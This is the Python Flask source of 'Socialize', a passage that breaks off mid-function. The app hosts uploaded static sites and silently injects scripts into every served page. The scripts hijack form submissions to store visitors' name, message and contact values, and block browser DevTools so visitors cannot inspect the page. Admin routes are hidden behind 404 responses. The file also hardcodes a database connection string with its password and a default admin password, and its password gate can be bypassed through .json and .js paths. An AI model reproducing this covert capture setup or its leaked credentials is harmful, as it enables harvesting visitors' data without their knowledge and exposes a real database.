"""
Socialize — repo host + form capture + file manager.
Can host full static sites (like PH3D) from uploaded ZIPs.
Admin routes return 404 for non-admins. Admin pages carry noindex.
Per-repo password protection. Anti-DevTools script injection.
"""
import os, io, json, zipfile, mimetypes, html as html_mod
from datetime import datetime
from functools import wraps
from flask import (Flask, request, session, redirect, url_for,
                   send_file, jsonify, abort, flash, get_flashed_messages)
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func, or_

import cloudinary
import cloudinary.uploader

# ---------------- config ----------------
BASE = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-change-me")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "socialize123")
app.config["MAX_CONTENT_LENGTH"] = 100 * 1024 * 1024  # 100 MB

DATABASE_URL = "postgresql+psycopg2://neondb_owner:npg_V06GRufFMiyB@ep-still-field-b4uk713g-pooler.c-6.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

db_url = os.environ.get("DATABASE_URL", DATABASE_URL)
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)
if db_url.startswith("postgresql://"):
    db_url = db_url.replace("postgresql://", "postgresql+psycopg2://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = db_url
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {"pool_pre_ping": True, "pool_recycle": 280}
db = SQLAlchemy(app)

CLOUD_NAME = os.environ.get("CLOUDINARY_CLOUD_NAME", "")
CLOUD_API_KEY = os.environ.get("CLOUDINARY_API_KEY", "")
CLOUD_API_SECRET = os.environ.get("CLOUDINARY_API_SECRET", "")

cloudinary_ready = False
if CLOUD_NAME and CLOUD_API_KEY and CLOUD_API_SECRET:
    cloudinary.config(cloud_name=CLOUD_NAME, api_key=CLOUD_API_KEY,
                      api_secret=CLOUD_API_SECRET, secure=True)
    cloudinary_ready = True

# ---------------- models ----------------
class Repo(db.Model):
    __tablename__ = "repos"
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False, index=True)
    name = db.Column(db.String(200), nullable=False)
    password = db.Column(db.String(200), nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class File(db.Model):
    __tablename__ = "files"
    id = db.Column(db.Integer, primary_key=True)
    repo_id = db.Column(db.Integer, db.ForeignKey("repos.id"), nullable=False, index=True)
    path = db.Column(db.String(500), nullable=False)
    is_dir = db.Column(db.Boolean, default=False, nullable=False)
    is_binary = db.Column(db.Boolean, default=False, nullable=False)
    content = db.Column(db.Text, default="")
    cloud_url = db.Column(db.String(1000), nullable=True)
    cloud_public_id = db.Column(db.String(500), nullable=True)
    size = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    __table_args__ = (db.UniqueConstraint("repo_id", "path", name="uq_repo_path"),)

class Submission(db.Model):
    __tablename__ = "submissions"
    id = db.Column(db.Integer, primary_key=True)
    repo_id = db.Column(db.Integer, db.ForeignKey("repos.id"), nullable=False, index=True)
    data = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# ---------------- helpers ----------------
def esc(s): return html_mod.escape(str(s))

def fmt_size(n):
    n = n or 0
    if n < 1024: return f"{n} B"
    if n < 1024*1024: return f"{n/1024:.1f} KB"
    return f"{n/1024/1024:.1f} MB"

def is_admin(): return session.get("admin") is True

def admin_required(f, hide=False):
    @wraps(f)
    def w(*a, **k):
        if not is_admin():
            if hide:
                abort(404)
            return redirect(url_for("login", next=request.path))
        return f(*a, **k)
    return w

def admin_hidden(f):
    return admin_required(f, hide=True)

def get_repo(slug):
    return Repo.query.filter(func.lower(Repo.slug) == slug.lower()).first()

def repo_unlocked(repo):
    """True if admin, or repo has no password, or user has entered correct password."""
    if is_admin():
        return True
    if not repo.password:
        return True
    
    # FIX: Always allow static assets (CSS, JS, images) to load so the page doesn't break.
    # Only block the main HTML pages behind the password gate.
    static_exts = (".css", ".js", ".mjs", ".png", ".jpg", ".jpeg", ".gif", 
                   ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map", ".json")
    if request.path.lower().endswith(static_exts):
        return True
        
    return session.get(f"repo_unlocked_{repo.id}") is True

def phone_download_dir():
    for c in ("/storage/emulated/0/Download", "/sdcard/Download",
              os.path.expanduser("~/Download"), os.path.expanduser("~/Downloads")):
        if os.path.isdir(c) and os.access(c, os.W_OK):
            return c
    return None

def upsert_file(repo_id, path, content="", is_dir=False, cloud_url=None, cloud_public_id=None, size=None):
    path = path.strip("/")
    if not path: return
    parts = path.split("/")
    for i in range(1, len(parts)):
        parent = "/".join(parts[:i])
        if not File.query.filter_by(repo_id=repo_id, path=parent).first():
            db.session.add(File(repo_id=repo_id, path=parent, is_dir=True, content="", size=0))
    f = File.query.filter_by(repo_id=repo_id, path=path).first()
    is_binary = cloud_url is not None
    final_size = size if size is not None else (len(content or "") if not is_binary else 0)
    if f:
        f.content = "" if is_binary else (content or "")
        f.cloud_url = cloud_url
        f.cloud_public_id = cloud_public_id
        f.is_binary = is_binary
        f.size = final_size
        f.is_dir = is_dir
        f.updated_at = datetime.utcnow()
    else:
        db.session.add(File(repo_id=repo_id, path=path,
                            content="" if is_binary else (content or ""),
                            cloud_url=cloud_url, cloud_public_id=cloud_public_id,
                            is_binary=is_binary, size=final_size, is_dir=is_dir))
    db.session.commit()

def upload_to_cloudinary(repo, path, raw):
    if not cloudinary_ready:
        raise Exception("Cloudinary not configured")
    public_id = f"socialize/{repo.slug}/{path}"
    result = cloudinary.uploader.upload(raw, public_id=public_id, resource_type="auto",
                                        overwrite=True, unique_filename=False, use_filename=True)
    return result.get("secure_url"), result.get("public_id")

def delete_cloudinary_file(public_id):
    if not cloudinary_ready or not public_id: return
    try:
        cloudinary.uploader.destroy(public_id, resource_type="auto")
    except Exception:
        pass

# ---------------- anti-devtools script ----------------
_ANTI_DEVTOOLS_JS = """
<script>
(function(){
  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
  document.addEventListener('keydown', function(e){
    if (e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U') ||
        (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  });
  var devtoolsOpen = false;
  var threshold = 160;
  setInterval(function(){
    var wDiff = window.outerWidth  - window.innerWidth  > threshold;
    var hDiff = window.outerHeight - window.innerHeight > threshold;
    if (wDiff || hDiff) {
      if (!devtoolsOpen) {
        devtoolsOpen = true;
        try {
          document.body.innerHTML = '<div style="position:fixed;inset:0;background:#000;color:#f55;display:flex;align-items:center;justify-content:center;font-family:sans-serif;font-size:18px;z-index:999999">Close DevTools to continue</div>';
        } catch(e){}
      }
    } else if (devtoolsOpen) {
      devtoolsOpen = false;
      location.reload();
    }
  }, 500);
})();
</script>
"""

# ---------------- capture script ----------------
_CAPTURE_JS = """
<script>
(function(){
  var ids = ['name','message','contact'];
  document.querySelectorAll('form').forEach(function(f){
    if(!ids.some(function(id){return f.querySelector('#'+id)})) return;
    f.addEventListener('submit', function(e){
      e.preventDefault();
      var data = {};
      ids.forEach(function(id){
        var el = f.querySelector('#'+id);
        if(el) data[id] = el.value;
      });
      fetch('/_capture/__SLUG__', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(data)
      }).then(function(r){
        if(r.ok){ f.reset(); alert('Submitted.'); }
        else alert('Error');
      }).catch(function(){ alert('Error'); });
    });
  });
})();
</script>
"""

def inject_capture(html_text, slug, anti_devtools=True):
    if not html_text: return html_text
    combined = ""
    if anti_devtools:
        combined += _ANTI_DEVTOOLS_JS
    combined += _CAPTURE_JS.replace("__SLUG__", slug)
    if "</body>" in html_text:
        return html_text.replace("</body>", combined + "</body>", 1)
    return html_text + combined

# ---------------- CSS ----------------
CSS = """<style>
:root{--bg:#0f172a;--card:#1e293b;--text:#e2e8f0;--accent:#38bdf8;--muted:#94a3b8;--danger:#f87171;--border:#334155;--pad:24px;--radius:12px}
*{box-sizing:border-box}
body{margin:0;font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.5}
.wrap{max-width:1100px;margin:0 auto;padding:var(--pad)}
header{display:flex;justify-content:space-between;align-items:center;gap:12px;padding-bottom:16px;border-bottom:1px solid var(--border);margin-bottom:24px;flex-wrap:wrap}
h1{margin:0;font-size:22px}h2{font-size:17px;margin:0 0 12px}
.brand{color:var(--accent)}a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
.card{background:var(--card);border-radius:var(--radius);padding:20px;margin-bottom:16px;border:1px solid var(--border)}
input,textarea,select{font:inherit;font-size:16px;padding:12px 14px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:var(--text);width:100%}
textarea{font-family:ui-monospace,Menlo,monospace;font-size:13px;min-height:320px;resize:vertical}
button{background:var(--accent);color:#0f172a;font-weight:600;border:none;cursor:pointer;padding:12px 20px;border-radius:8px;font-size:15px;width:auto}
button:hover{opacity:.9}button.danger{background:var(--danger);color:#fff}
.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
.row input{flex:1;min-width:160px}
.muted{color:var(--muted);font-size:14px}
table{width:100%;border-collapse:collapse;margin-top:8px}
td,th{padding:10px;text-align:left;border-bottom:1px solid var(--border);font-size:14px}
th{color:var(--muted);font-size:12px;text-transform:uppercase}
.flash{padding:12px;background:#1e3a5f;border-radius:8px;margin-bottom:16px;border-left:4px solid var(--accent)}
pre{margin:0;font-size:12px;overflow:auto;max-height:220px;background:#0b1220;padding:8px;border-radius:6px;white-space:pre-wrap;word-break:break-word}
.badge{padding:3px 8px;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.05em}
.badge.lock{background:#7c2d12;color:#fed7aa}
.badge.open{background:#14532d;color:#bbf7d0}
@media (max-width:640px){
  .row{flex-direction:column;align-items:stretch}
  .row input,.row button{width:100%}
  td,th{padding:8px 6px;font-size:12px}
}
</style>"""

def page(title, body, noindex=False):
    signout = '<a href="/logout">Sign out</a>' if is_admin() else ''
    robots = '<meta name="robots" content="noindex, nofollow">' if noindex else ''
    return f"""<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
{robots}
<title>{esc(title)} · Socialize</title>{CSS}</head><body>
<div class="wrap">
<header><h1><a href="/" style="color:inherit;text-decoration:none"><span class="brand">Socialize</span></a></h1>
<div>{signout}</div></header>
{body}</div></body></html>"""

# ---------------- routes ----------------
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["admin"] = True
            nxt = request.args.get("next") or "/"
            if not nxt.startswith("/"): nxt = "/"
            return redirect(nxt)
        error = "Incorrect password"
    body = f"""
    <div class="card" style="max-width:400px;margin:60px auto">
      <h2>Admin login</h2>
      {f'<p style="color:var(--danger)">{esc(error)}</p>' if error else ''}
      <form method="post">
        <input type="password" name="password" placeholder="Admin password" required autofocus>
        <div style="height:12px"></div>
        <button type="submit">Sign in</button>
      </form>
    </div>"""
    return page("Login", body, noindex=True)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/")
@admin_hidden
def dashboard():
    repos = Repo.query.order_by(Repo.created_at.desc()).all()
    total_subs = Submission.query.count()
    recent = Submission.query.order_by(Submission.created_at.desc()).limit(50).all()

    repo_rows = ""
    if repos:
        for r in repos:
            nf = File.query.filter_by(repo_id=r.id, is_dir=False).count()
            ns = Submission.query.filter_by(repo_id=r.id).count()
            lock_badge = '<span class="badge lock">🔒</span>' if r.password else '<span class="badge open">public</span>'
            repo_rows += f"""<tr>
              <td><a href="/{esc(r.slug)}" target="_blank"><strong>{esc(r.slug)}</strong></a> {lock_badge}</td>
              <td>{nf}</td><td>{ns}</td>
              <td>
                <a href="/_manage/{esc(r.slug)}">Manage</a> ·
                <a href="/export/{esc(r.slug)}">Export ZIP</a> ·
                <form method="post" action="/repos/{esc(r.slug)}/delete" style="display:inline"
                      onsubmit="return confirm('Delete repo and all files?')">
                  <button class="danger" style="padding:3px 10px;font-size:12px">Delete</button>
                </form>
              </td></tr>"""
    else:
        repo_rows = '<tr><td colspan="4" class="muted">No repos yet.</td></tr>'

    sub_rows = ""
    if recent:
        for s in recent:
            try:
                d = json.loads(s.data); txt = json.dumps(d, indent=2)
            except Exception:
                txt = s.data
            rr = Repo.query.get(s.repo_id)
            sub_rows += f"""<tr>
              <td class="muted">{s.created_at.strftime('%Y-%m-%d %H:%M')}</td>
              <td>{esc(rr.slug if rr else '?')}</td>
              <td><pre>{esc(txt)}</pre></td>
              <td>
                <form method="post" action="/_submissions/{s.id}/delete" style="display:inline"
                      onsubmit="return confirm('Delete this submission?')">
                  <button class="danger" style="padding:3px 10px;font-size:12px">Delete</button>
                </form>
              </td></tr>"""
    else:
        sub_rows = '<tr><td colspan="4" class="muted">No submissions yet.</td></tr>'

    if repos:
        opts = "".join(f'<option value="{esc(r.slug)}">{esc(r.slug)}</option>' for r in repos)
        per_repo = f"""<form method="post" action="/_submissions/clear" style="display:inline"
                          onsubmit="return confirm('Clear all submissions for this repo?')">
          <select name="slug" style="width:auto;padding:6px 10px">{opts}</select>
          <button class="danger" style="padding:6px 14px;font-size:13px">Clear</button>
        </form>"""
    else:
        per_repo = ""

    cdn_warn = ""
    if not cloudinary_ready:
        cdn_warn = '<div class="flash" style="background:#7c2d12;border-left-color:#f87171">⚠ Cloudinary not configured. Binary uploads >500 KB will fail.</div>'

    body = f"""
    {cdn_warn}
    <div class="card">
      <h2>Create repository</h2>
      <form method="post" action="/repos/new" class="row">
        <input name="slug" placeholder="slug (e.g. Ph3d)" required>
        <input name="password" placeholder="optional password (leave empty = public)">
        <button type="submit">Create</button>
      </form>
      <p class="muted">A repo password makes visitors enter it before the site loads. Empty = public site. A top-level wrapper folder in uploaded ZIPs is stripped automatically.</p>
    </div>
    <div class="card">
      <h2>Repositories ({len(repos)})</h2>
      <table><tr><th>Slug</th><th>Files</th><th>Subs</th><th>Actions</th></tr>{repo_rows}</table>
    </div>
    <div class="card" id="subs">
      <div class="row" style="justify-content:space-between">
        <h2 style="margin:0">Submissions ({total_subs})</h2>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
          <form method="post" action="/_submissions/clear" style="display:inline"
                onsubmit="return confirm('Delete ALL submissions?')">
            <button class="danger" style="padding:6px 14px;font-size:13px">Clear All</button>
          </form>
          {per_repo}
        </div>
      </div>
      <table><tr><th>Time</th><th>Repo</th><th>Data</th><th></th></tr>{sub_rows}</table>
    </div>"""
    return page("Dashboard", body, noindex=True)

@app.route("/_submissions/<int:sid>/delete", methods=["POST"])
@admin_required
def delete_submission(sid):
    s = Submission.query.get(sid)
    if s:
        db.session.delete(s)
        db.session.commit()
    return redirect(url_for("dashboard") + "#subs")

@app.route("/_submissions/clear", methods=["POST"])
@admin_required
def clear_submissions():
    slug = (request.form.get("slug") or "").strip()
    if slug:
        repo = get_repo(slug)
        if repo:
            Submission.query.filter_by(repo_id=repo.id).delete()
            db.session.commit()
    else:
        Submission.query.delete()
        db.session.commit()
    return redirect(url_for("dashboard") + "#subs")

@app.route("/repos/new", methods=["POST"])
@admin_required
def new_repo():
    slug = (request.form.get("slug") or "").strip()
    password = (request.form.get("password") or "").strip() or None
    if not slug or "/" in slug or slug.startswith("_"):
        flash("Invalid slug")
        return redirect(url_for("dashboard"))
    if get_repo(slug):
        flash("Slug already exists")
        return redirect(url_for("dashboard"))
    db.session.add(Repo(slug=slug, name=slug, password=password))
    db.session.commit()
    flash(f"Created repo: {slug}" + (" (password protected)" if password else ""))
    return redirect(url_for("manage_files", slug=slug))

@app.route("/repos/<slug>/set-password", methods=["POST"])
@admin_required
def set_repo_password(slug):
    r = get_repo(slug)
    if not r: abort(404)
    new_pw = (request.form.get("password") or "").strip() or None
    r.password = new_pw
    db.session.commit()
    flash("Password updated" if new_pw else "Password removed — repo is now public")
    return redirect(url_for("manage_files", slug=slug))

@app.route("/repos/<slug>/delete", methods=["POST"])
@admin_required
def delete_repo(slug):
    r = get_repo(slug)
    if r:
        for f in File.query.filter_by(repo_id=r.id, is_binary=True).all():
            delete_cloudinary_file(f.cloud_public_id)
        File.query.filter_by(repo_id=r.id).delete()
        Submission.query.filter_by(repo_id=r.id).delete()
        db.session.delete(r)
        db.session.commit()
        flash(f"Deleted repo: {slug}")
    return redirect(url_for("dashboard"))

# ---------------- repo unlock ----------------
@app.route("/<slug>/unlock", methods=["GET", "POST"])
def repo_unlock(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    if not repo.password:
        return redirect(url_for("serve_index", slug=repo.slug))
    error = None
    if request.method == "POST":
        if request.form.get("password") == repo.password:
            session[f"repo_unlocked_{repo.id}"] = True
            return redirect(url_for("serve_index", slug=repo.slug))
        error = "Incorrect password"
    body = f"""
    <div class="card" style="max-width:400px;margin:60px auto">
      <h2>🔒 {esc(repo.slug)} is protected</h2>
      <p class="muted">Enter the password to view this site.</p>
      {f'<p style="color:var(--danger)">{esc(error)}</p>' if error else ''}
      <form method="post">
        <input type="password" name="password" placeholder="Repo password" required autofocus>
        <div style="height:12px"></div>
        <button type="submit">Unlock</button>
      </form>
    </div>"""
    return page(repo.slug, body, noindex=True)

# ---------------- file serving ----------------
def _serve_file(f, repo):
    if f.is_binary and f.cloud_url:
        return redirect(f.cloud_url)

    path_lower = f.path.lower()
    content = f.content or ""

    if path_lower.endswith((".html", ".htm")):
        content = inject_capture(content, repo.slug, anti_devtools=True)
        return content, 200, {"Content-Type": "text/html; charset=utf-8"}

    if path_lower.endswith((".js", ".mjs")):
        return content, 200, {"Content-Type": "application/javascript; charset=utf-8"}

    if path_lower.endswith(".css"):
        return content, 200, {"Content-Type": "text/css; charset=utf-8"}

    if path_lower.endswith(".json"):
        return content, 200, {"Content-Type": "application/json; charset=utf-8"}

    if path_lower.endswith(".svg"):
        return content, 200, {"Content-Type": "image/svg+xml"}

    if path_lower.endswith(".xml"):
        return content, 200, {"Content-Type": "application/xml; charset=utf-8"}

    if path_lower.endswith(".txt"):
        return content, 200, {"Content-Type": "text/plain; charset=utf-8"}

    mime = mimetypes.guess_type(f.path)[0] or "text/plain"
    if not mime.startswith(("text", "image", "audio", "video")) and "javascript" not in mime:
        mime = "text/plain"
    charset = "; charset=utf-8" if mime.startswith("text") else ""
    return content, 200, {"Content-Type": mime + charset}

@app.route("/<slug>")
@app.route("/<slug>/")
def serve_index(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    if not repo_unlocked(repo):
        return redirect(url_for("repo_unlock", slug=repo.slug))
    f = File.query.filter_by(repo_id=repo.id, path="index.html").first()
    if f: return _serve_file(f, repo)
    f = File.query.filter(File.repo_id == repo.id, File.path.like("%/index.html")).first()
    if f: return _serve_file(f, repo)
    return page(slug, '<div class="card"><h2>No index.html in this repo yet.</h2>'
                      f'<p class="muted">Upload a ZIP or create index.html manually.</p></div>')

@app.route("/<slug>/<path:filepath>")
def serve_path(slug, filepath):
    repo = get_repo(slug)
    if not repo: abort(404)
    if not repo_unlocked(repo):
        return redirect(url_for("repo_unlock", slug=repo.slug))
    f = File.query.filter_by(repo_id=repo.id, path=filepath).first()
    if f:
        return _serve_file(f, repo)
    f = File.query.filter_by(repo_id=repo.id, path=filepath.rstrip("/") + "/index.html").first()
    if f:
        return _serve_file(f, repo)
    f = File.query.filter_by(repo_id=repo.id, path="index.html").first()
    if f:
        return _serve_file(f, repo)
    abort(404)

@app.route("/_capture/<slug>", methods=["POST"])
def capture(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    db.session.add(Submission(repo_id=repo.id, data=json.dumps(data)))
    db.session.commit()
    return jsonify(ok=True)

# ---------------- file manager ----------------
def _flash_html():
    return "".join(f'<div class="flash">{esc(m)}</div>' for m in get_flashed_messages())

@app.route("/_manage/<slug>")
@admin_hidden
def manage_files(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    files = File.query.filter_by(repo_id=repo.id).order_by(File.path).all()

    rows = ""
    for f in files:
        icon = "📁" if f.is_dir else ("🖼️" if f.is_binary else "📄")
        disp = esc(f.path) + ("/" if f.is_dir else "")
        edit = f'<a href="/_manage/{esc(repo.slug)}/edit?path={esc(f.path)}">Edit</a> · ' if (not f.is_dir and not f.is_binary) else ''
        view = f'<a href="/{esc(repo.slug)}/{esc(f.path)}" target="_blank">View</a> · ' if not f.is_dir else ''
        rows += f"""<tr>
          <td><input type="checkbox" name="paths" value="{esc(f.path)}" style="width:auto"></td>
          <td>{icon} {disp}</td>
          <td class="muted">{fmt_size(f.size)}</td>
          <td class="muted">{f.updated_at.strftime('%Y-%m-%d %H:%M') if f.updated_at else ''}</td>
          <td>{edit}{view}<a href="/_manage/{esc(repo.slug)}/delete-one?path={esc(f.path)}"
              onclick="return confirm('Delete {esc(f.path)}?')">Delete</a></td>
        </tr>"""
    if not files:
        rows = '<tr><td colspan="5" class="muted">No files. Upload a ZIP or create one.</td></tr>'

    pw_section = f"""
    <div class="card">
      <h2>🔒 Password protection</h2>
      <p class="muted">Current: {'<span class="badge lock">PROTECTED</span>' if repo.password else '<span class="badge open">PUBLIC</span>'}</p>
      <form method="post" action="/repos/{esc(repo.slug)}/set-password" class="row">
        <input type="text" name="password" placeholder="New password (empty = remove)">
        <button type="submit">Update</button>
      </form>
    </div>"""

    body = f"""
    {_flash_html()}
    <div class="card">
      <h2>{esc(repo.slug)} · File Manager</h2>
      <p class="muted">Public URL: <a href="/{esc(repo.slug)}" target="_blank">/{esc(repo.slug)}</a></p>
    </div>
    {pw_section}
    <div class="card">
      <h2>Upload ZIP</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/upload" enctype="multipart/form-data" class="row">
        <input type="file" name="zip" accept=".zip" required>
        <input name="target" placeholder="target folder (optional)">
        <button type="submit">Upload &amp; Extract</button>
      </form>
      <p class="muted">A single top-level wrapper folder in the ZIP is stripped automatically.</p>
    </div>
    <div class="card">
      <h2>Upload single file</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/upload-file" enctype="multipart/form-data" class="row">
        <input type="file" name="file" required>
        <input name="target" placeholder="target folder (optional)">
        <button type="submit">Upload File</button>
      </form>
    </div>
    <div class="card">
      <h2>Create</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/new" class="row">
        <input name="path" placeholder="path (e.g. index.html)" required>
        <input type="hidden" name="kind" value="file">
        <button type="submit">New File</button>
      </form>
      <form method="post" action="/_manage/{esc(repo.slug)}/new" class="row">
        <input name="path" placeholder="path (e.g. assets)" required>
        <input type="hidden" name="kind" value="folder">
        <button type="submit">New Folder</button>
      </form>
    </div>
    <div class="card">
      <form method="post" action="/_manage/{esc(repo.slug)}/move">
        <h2>Files ({len(files)})</h2>
        <div class="row">
          <input name="target" placeholder="Move selected to folder (empty = root)" style="flex:1">
          <button type="submit">Move Selected</button>
          <button type="submit" formaction="/_manage/{esc(repo.slug)}/delete"
                  class="danger" onclick="return confirm('Delete selected?')">Delete Selected</button>
        </div>
        <table><tr><th></th><th>Path</th><th>Size</th><th>Updated</th><th>Actions</th></tr>{rows}</table>
      </form>
    </div>"""
    return page("Manage " + repo.slug, body, noindex=True)

def _store_uploaded_blob(repo, path, raw):
    if len(raw) > 500_000:
        url, public_id = upload_to_cloudinary(repo, path, raw)
        upsert_file(repo.id, path, content="", is_dir=False,
                    cloud_url=url, cloud_public_id=public_id, size=len(raw))
        return "binary"
    try:
        text = raw.decode("utf-8")
        upsert_file(repo.id, path, text, is_dir=False)
        return "text"
    except UnicodeDecodeError:
        url, public_id = upload_to_cloudinary(repo, path, raw)
        upsert_file(repo.id, path, content="", is_dir=False,
                    cloud_url=url, cloud_public_id=public_id, size=len(raw))
        return "binary"

@app.route("/_manage/<slug>/upload", methods=["POST"])
@admin_required
def upload_zip(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    up = request.files.get("zip")
    if not up: abort(400)
    target = (request.form.get("target") or "").strip().strip("/")

    try:
        with zipfile.ZipFile(up.stream) as z:
            names = [n for n in z.namelist()
                     if not n.endswith("/")
                     and not n.startswith("__MACOSX/")
                     and "/._" not in n
                     and not n.endswith(".DS_Store")]

            top_levels = {n.split("/")[0] for n in names if "/" in n}
            prefix = ""
            if len(top_levels) == 1:
                candidate = top_levels.pop()
                if all(n.startswith(candidate + "/") for n in names):
                    prefix = candidate + "/"

            ok_txt = ok_bin = 0
            errors = []
            for name in names:
                raw = z.read(name)
                rel = name[len(prefix):] if prefix else name
                if not rel: continue
                path = f"{target}/{rel}" if target else rel
                try:
                    kind = _store_uploaded_blob(repo, path, raw)
                    if kind == "binary": ok_bin += 1
                    else: ok_txt += 1
                except Exception as e:
                    errors.append(f"{rel}: {e}")

        msg = f"Extracted — {ok_txt} text, {ok_bin} binary"
        if prefix:
            msg += f" (stripped '{prefix.rstrip('/')}/')"
        if errors:
            msg += f" · {len(errors)} errors: " + "; ".join(errors[:3])
        flash(msg)
    except Exception as e:
        flash(f"ZIP error: {e}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/upload-file", methods=["POST"])
@admin_required
def upload_single_file(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    up = request.files.get("file")
    if not up or not up.filename: abort(400)
    target = (request.form.get("target") or "").strip().strip("/")
    name = os.path.basename(up.filename)
    path = f"{target}/{name}" if target else name
    try:
        kind = _store_uploaded_blob(repo, path, up.read())
        flash(f"Uploaded {path} ({kind})")
    except Exception as e:
        flash(f"Upload failed: {e}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/new", methods=["POST"])
@admin_required
def new_item(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    path = (request.form.get("path") or "").strip().strip("/")
    kind = request.form.get("kind", "file")
    if not path:
        flash("Path required"); return redirect(url_for("manage_files", slug=repo.slug))
    if File.query.filter_by(repo_id=repo.id, path=path).first():
        flash("Already exists"); return redirect(url_for("manage_files", slug=repo.slug))
    upsert_file(repo.id, path, "", is_dir=(kind == "folder"))
    if kind == "file":
        return redirect(url_for("edit_file", slug=repo.slug, path=path))
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/delete", methods=["POST"])
@admin_required
def delete_selected(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    for p in request.form.getlist("paths"):
        for f in File.query.filter(File.repo_id == repo.id,
                                    or_(File.path == p, File.path.like(p + "/%"))).all():
            if f.is_binary:
                delete_cloudinary_file(f.cloud_public_id)
            db.session.delete(f)
    db.session.commit()
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/delete-one")
@admin_required
def delete_one(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    p = request.args.get("path")
    if p:
        for f in File.query.filter(File.repo_id == repo.id,
                                    or_(File.path == p, File.path.like(p + "/%"))).all():
            if f.is_binary:
                delete_cloudinary_file(f.cloud_public_id)
            db.session.delete(f)
        db.session.commit()
        flash(f"Deleted: {p}")
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/move", methods=["POST"])
@admin_required
def move_selected(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    paths = request.form.getlist("paths")
    target = (request.form.get("target") or "").strip().strip("/")
    for p in paths:
        f = File.query.filter_by(repo_id=repo.id, path=p).first()
        if not f: continue
        name = p.split("/")[-1]
        newpath = f"{target}/{name}" if target else name
        if f.is_dir:
            desc = File.query.filter(File.repo_id == repo.id, File.path.like(p + "/%")).all()
            for d in desc: d.path = newpath + d.path[len(p):]
        f.path = newpath
    db.session.commit()
    return redirect(url_for("manage_files", slug=repo.slug))

@app.route("/_manage/<slug>/edit", methods=["GET", "POST"])
@admin_required
def edit_file(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    path = request.args.get("path") or request.form.get("path")
    if not path: abort(400)
    f = File.query.filter_by(repo_id=repo.id, path=path).first()
    if not f or f.is_dir or f.is_binary: abort(404)
    if request.method == "POST":
        f.content = request.form.get("content", "")
        f.size = len(f.content)
        f.updated_at = datetime.utcnow()
        db.session.commit()
        flash("Saved")
        return redirect(url_for("edit_file", slug=repo.slug, path=path))
    body = f"""
    {_flash_html()}
    <div class="card">
      <h2>Edit: {esc(path)}</h2>
      <form method="post" action="/_manage/{esc(repo.slug)}/edit">
        <input type="hidden" name="path" value="{esc(path)}">
        <textarea name="content" spellcheck="false">{esc(f.content)}</textarea>
        <div class="row" style="margin-top:12px">
          <button type="submit">Save</button>
          <a href="/_manage/{esc(repo.slug)}" style="padding:10px 18px">Back</a>
        </div>
      </form>
    </div>"""
    return page("Edit", body, noindex=True)

# ---------------- export ----------------
@app.route("/export/<slug>")
@admin_hidden
def export_repo(slug):
    repo = get_repo(slug)
    if not repo: abort(404)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for f in File.query.filter_by(repo_id=repo.id, is_dir=False).all():
            if f.is_binary and f.cloud_url:
                try:
                    import urllib.request
                    with urllib.request.urlopen(f.cloud_url, timeout=15) as resp:
                        z.writestr(f.path, resp.read())
                except Exception:
                    z.writestr(f.path, f"<!-- fetch failed: {f.cloud_url} -->")
            else:
                z.writestr(f.path, f.content or "")
        subs = Submission.query.filter_by(repo_id=repo.id).all()
